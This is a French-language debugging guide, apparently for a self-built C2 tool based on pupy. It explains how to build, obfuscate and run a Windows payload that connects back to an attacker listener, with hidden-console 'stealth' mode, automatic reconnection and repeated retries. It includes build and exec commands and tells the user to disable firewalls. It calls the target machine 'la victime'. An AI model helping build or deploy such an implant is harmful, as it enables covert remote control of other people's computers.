# 🐛 Guide de Debug Complet

## Pourquoi l'exe s'ouvre et se ferme ? (Écran noir)

### ✅ SOLUTION FINALE

Le payload a maintenant :
1. **10 tentatives de connexion** (délai 5s entre chaque)
2. **Reconnexion automatique** si la connexion est perdue
3. **Mode DEBUG** avec fichier de log
4. **Détachement de la console** Windows (tourne en arrière-plan)

---

## 📋 Checklist de Debug

### Avant de lancer le payload :

- [ ] **Listener démarré** sur macOS
  ```
  App → Clients → Start Listener
  Status: 🟢 Listening on 192.168.1.40:4444
  ```

- [ ] **Firewall désactivé** (temporairement pour tests)
  - **macOS** : Préférences → Sécurité → Firewall → OFF
  - **Windows** : Panneau de contrôle → Pare-feu → Désactiver

- [ ] **IP correcte** dans le build_config.json
  ```json
  {
    "listener_ip": "192.168.1.40",  // TON IP LOCALE
    "listener_port": 4444,
    "obfuscation_level": 2
  }
  ```

- [ ] **Obfuscation niveau 2** pour tests rapides (délai 1-3s)

---

## 🔍 Activer le Mode DEBUG

### Méthode 1: Modifier le code avant build

Dans `src/c2_payload_complete.py`, ligne ~35 :
```python
self.debug_mode = True  # Activer le debug
```

### Méthode 2: Rebuild avec debug

```bash
cd /Users/kalilbelgoumri/Desktop/pupy-c2-manager-macos
python3 -c "
from src.c2_bundler_simple import C2Bundler
bundler = C2Bundler()
payload = bundler.generate_payload('192.168.1.40', 4444, 2, debug_mode=True)
temp = bundler.save_payload(payload)
bundler.bundle_with_pyinstaller(temp, 'windows')
"
```

---

## 📊 Lire les Logs de Debug

### Sur Windows :

1. Exécute le `c2_payload.exe`
2. Va dans le dossier TEMP :
   ```
   C:\Users\TON_NOM\AppData\Local\Temp\
   ```
3. Ouvre `c2_debug.log`

### Exemple de log réussi :
```
10:25:30 - Attempting connection to 192.168.1.40:4444
10:25:30 - Connection successful!
```

### Exemple de log échoué (firewall) :
```
10:25:30 - Attempting connection to 192.168.1.40:4444
10:25:40 - Connection failed: [WinError 10060] Connection timed out
10:25:45 - Attempting connection to 192.168.1.40:4444
10:25:55 - Connection failed: [WinError 10060] Connection timed out
```

### Exemple de log échoué (mauvaise IP) :
```
10:25:30 - Attempting connection to 0.0.0.0:4444
10:25:30 - Connection failed: [WinError 10049] Invalid address
```

---

## 🧪 Test Local (sur macOS)

Tu peux tester le payload AVANT de compiler pour Windows :

```bash
# Terminal 1 : Démarre le listener
python3 src/main.py
# → Clients → Start Listener

# Terminal 2 : Test le payload
cd /Users/kalilbelgoumri/Desktop/pupy-c2-manager-macos
python3 -c "
from src.c2_payload_complete import C2PayloadGenerator
gen = C2PayloadGenerator('127.0.0.1', 4444, 1)
code = gen.generate()
exec(code)
"
```

Si ça marche sur macOS, ça marchera sur Windows avec la bonne IP !

---

## 🔧 Dépannage par Symptôme

| Symptôme | Cause Probable | Solution |
|----------|---------------|----------|
| Fenêtre flash et disparaît | Pas de retry loop | ✅ Corrigé dans v2.1 |
| Pas de connexion visible | Firewall bloque | Désactive firewall |
| Log: "Connection failed: 10060" | Listener pas démarré | Démarre listener avant |
| Log: "Connection failed: 10049" | IP invalide (0.0.0.0) | ✅ Corrigé workflow |
| Pas de log du tout | Debug mode off | Active debug_mode=True |
| Délai de 60-300s | Obfuscation niveau 5 | ✅ Réduit à 3-8s |

---

## 🎯 Procédure de Test Complète

### 1. Préparation (macOS)
```bash
cd /Users/kalilbelgoumri/Desktop/pupy-c2-manager-macos
python3 src/main.py
```

### 2. Configuration
- Settings → IP: `192.168.1.40`, Port: `4444`
- Clients → **Start Listener** → Status: 🟢

### 3. Build avec debug
- Bundler → IP: `192.168.1.40`, Port: `4444`, Obfuscation: `2`
- **☁️ Build Windows (GitHub)**

### 4. Test sur Windows
- Télécharge `c2_payload.exe` depuis GitHub Actions
- **Désactive le firewall Windows** (temporaire)
- Double-clic sur `c2_payload.exe`
- Attends 5-10 secondes (retry loop)
- Vérifie l'app macOS → Clients

### 5. Debug si échec
- Va dans `C:\Users\TON_NOM\AppData\Local\Temp\`
- Ouvre `c2_debug.log`
- Copie-colle le contenu du log

---

## 📝 Résumé des Changements v2.1

| Avant | Après |
|-------|-------|
| 1 tentative, échec = exit | 10 tentatives avec retry |
| Pas de logs | Debug log dans %TEMP% |
| Obfuscation 5 = 60-300s | Obfuscation 5 = 3-8s |
| IP hardcodée 0.0.0.0 | Workflow lit build_config.json |
| --windowed désactivé | --windowed activé (stealth) |
| Pas de reconnexion | Reconnexion auto si perdu |

---

## 🚀 Ce qui devrait se passer maintenant

1. **Tu lances le payload Windows**
2. La fenêtre se ferme (normal, --windowed)
3. Le payload tourne en arrière-plan
4. Il essaye de se connecter toutes les 5 secondes
5. **Après 5-10 secondes max**, tu vois la victime dans l'app macOS
6. Si ça marche pas, le log te dira EXACTEMENT pourquoi

---

## ❓ Questions Fréquentes

**Q: Pourquoi la fenêtre se ferme ?**  
R: C'est normal avec `--windowed`, le payload tourne en arrière-plan.

**Q: Comment savoir si ça tourne ?**  
R: Task Manager → Cherche `c2_payload.exe` dans les processus.

**Q: Pourquoi 10 tentatives seulement ?**  
R: Pour pas que le payload tourne indéfiniment. Tu peux augmenter dans le code.

**Q: Le log n'existe pas ?**  
R: Active `debug_mode = True` dans `c2_payload_complete.py` avant build.

**Q: Ça marche toujours pas ?**  
R: Vérifie que l'IP dans build_config.json est bien ta vraie IP locale (pas 0.0.0.0, pas 127.0.0.1).
